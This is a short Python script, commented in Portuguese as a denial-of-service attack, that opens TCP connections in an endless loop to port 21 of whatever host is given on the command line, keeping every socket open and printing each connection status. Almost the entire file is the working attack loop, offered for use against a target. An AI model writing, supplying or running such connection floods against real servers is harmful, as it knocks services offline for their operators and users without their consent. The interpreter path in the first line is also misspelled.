#!/urs/bin/python

#script que faz um ataque DoS

import sys
import socket

array = [1]
i = 1
while(1):
    array.append((socket.socket(socket.AF_INET, socket.SOCK_STREAM)))
    print("Dos em", sys.argv[1], "status:", (array[i].connect_ex((sys.argv[1], 21))))
    i = i + 1



